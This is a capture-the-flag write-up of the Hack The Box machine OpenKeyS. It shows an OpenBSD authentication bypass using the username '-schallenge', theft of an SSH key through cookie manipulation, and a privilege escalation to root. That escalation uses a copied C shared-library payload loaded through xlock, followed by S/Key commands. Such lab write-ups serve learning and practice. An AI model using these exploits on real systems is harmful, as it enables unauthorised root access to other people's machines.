---
"title": "Hack The Box - OpenKeyS"
"date": 2020-12-12
"tags": ["OpenBSD", "medium"]
"keywords": ["OpenBSD", "medium"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Link: [https://www.hackthebox.eu/home/machines/profile/267](https://www.hackthebox.eu/home/machines/profile/267)"
"featured_image": "/img/htb-openkeys/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-openkeys/Untitled.png)

Link: [https://www.hackthebox.eu/home/machines/profile/267](https://www.hackthebox.eu/home/machines/profile/267)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
80/tcp open  http    OpenBSD httpd
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|firewall
Running (JUST GUESSING): OpenBSD 4.X|6.X|5.X|3.X (95%), FreeBSD 10.X|7.X (91%), Cisco AsyncOS 7.X (87%)
OS CPE: cpe:/o:openbsd:openbsd:4.4 cpe:/o:openbsd:openbsd:6 cpe:/o:openbsd:openbsd:5 cpe:/o:openbsd:openbsd:3 cpe:/o:freebsd:freebsd:10.0 cpe:/o:freebsd:freebsd:7.0 cpe:/h:cisco:ironport_c650 cpe:/o:cisco:asyncos:7.0.1
Aggressive OS guesses: OpenBSD 4.4 - 4.5 (95%), OpenBSD 6.0 - 6.1 (95%), OpenBSD 5.0 - 5.8 (95%), OpenBSD 4.1 (93%), OpenBSD 5.0 (93%), OpenBSD 4.2 (93%), OpenBSD 4.0 (93%), OpenBSD 3.8 - 4.7 (92%), OpenBSD 4.6 (92%), OpenBSD 4.7 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

## HTTP Enumeration

Looking at the webpage it contains only a login page and nothing else, I tired like default credentials and SQLi. Nothing worked so let's run Gobuster.

![Untitled](/img/htb-openkeys/Untitled%201.png)

### GoBuster Scan Results

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.199
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/07/26 09:36:25 Starting gobuster
===============================================================
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/vendor (Status: 301)
===============================================================
2020/07/26 09:41:19 Finished
===============================================================
```

Checking all those dirs. and This one is really interesting.

![Untitled](/img/htb-openkeys/Untitled%202.png)

**SWP stands for SWaP file are located on a computer's hard drive, used by the virtual memory component of the computer to increase available memory.**

And we got something here. A username which is `Jennifer` and also a dir `../auth_helpers/check_auth` its going one directory which is probably before includes folder.

![Untitled](/img/htb-openkeys/Untitled%203.png)

And It downloading something

![Untitled](/img/htb-openkeys/Untitled%204.png)

Its a library file and  it says its OpenBSD

```bash
┌──(root🐺kali)-[~/htb/boxes/openkeys]
└─# file check_auth                        
check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped
```

With all those finding we got I just googled about openBSD libc and found this.

> [https://blog.firosolutions.com/exploits/cve-2019-19521-openbsd-libc-2019/](https://blog.firosolutions.com/exploits/cve-2019-19521-openbsd-libc-2019/)

It seems we can use `-schallenge` as username for authentication bypass so the only thing that come to my mind is the login page we found at first.

![Untitled](/img/htb-openkeys/Untitled%205.png)

So the username is `-schallenge` and password can be anything.

![Untitled](/img/htb-openkeys/Untitled%206.png)

And Im logged in as user `-schallenge` but its tell me there is no OpenSSH Key for this user, so we need to login as someother user:

![Untitled](/img/htb-openkeys/Untitled%207.png)

## Getting User Shell

I just captured the login request and tried some nothing worked.

![Untitled](/img/htb-openkeys/Untitled%208.png)

Then I decided to play with cookie, added a new one with Name as username and value as `jennifer` because thats the only username we got so far and so we can try for the ssh key.

![Untitled](/img/htb-openkeys/Untitled%209.png)

And After reload it logouts and I logged with the samecreds and I got the key.

![Untitled](/img/htb-openkeys/Untitled%2010.png)

I tried login with the key we got and it shows me Invalid Format. 

![Untitled](/img/htb-openkeys/Untitled%2011.png)

After some googling with that error. I came to know there is some possibility that it can be Putty Key

> [https://ma.ttias.be/convert-putty-private-key-to-openssh/](https://ma.ttias.be/convert-putty-private-key-to-openssh/)

I just converted it into normal format.

```bash
root@kali:~/CTF/HTB/Boxes/OpenKeyS# puttygen id_rsa -O private-openssh -o putty
```

And it worked 

![Untitled](/img/htb-openkeys/Untitled%2012.png)

## Privilege Escalation

While searching for the openBSD exploits in the beginning, I also found this.

> [https://packetstormsecurity.com/files/155572/Qualys-Security-Advisory-OpenBSD-Authentication-Bypass-Privilege-Escalation.html](https://packetstormsecurity.com/files/155572/Qualys-Security-Advisory-OpenBSD-Authentication-Bypass-Privilege-Escalation.html)

To Privilege Escalate to Root, First the user must be in `auth` group, in our case `jennifer` is not in `auth` group.

```bash
openkeys$ id
uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
```

To add the user to `auth` group, the `xlock` vulnerability will allow to add user `jennifer` to the auth group.

![Untitled](/img/htb-openkeys/Untitled%2013.png)

Copied the C payload:

```c
#include [paths.h](paths.h)
#include [sys/types.h](sys/types.h)
#include [unistd.h](unistd.h)

static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);

    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
```

Saved it as `swrast_dri.c` , then compile it and run it. 

```bash
openkeys$ vi swrast_dri.c                                               
openkeys$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c            
openkeys$ ls                                                 
swrast_dri.c   swrast_dri.so
openkeys$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
[2] 44334
openkeys$ _XSERVTransmkdir: Owner of /tmp/.X11-unix should be set to root

openkeys$ env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66
openkeys$ id
uid=1001(jennifer) gid=11(auth) groups=1001(jennifer), 0(wheel)
```

Now User Jennifer is in `auth` group.

If any user who is in `auth` group, we can follow this method to Privilege Escalate to Root:

![Untitled](/img/htb-openkeys/Untitled%2014.png)

Followed the same steps given in the POC, it will ask for password use the same in POC:

```bash
openkeys$ echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root
openkeys$ chmod 0600 /etc/skey/root
openkeys$ env -i TERM=vt220 su -l -a skey
otp-md5 99 obsd91335
S/Key Password:
openkeys# id                                                                                                                            
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
openkeys# whoami
root
```

We own the box!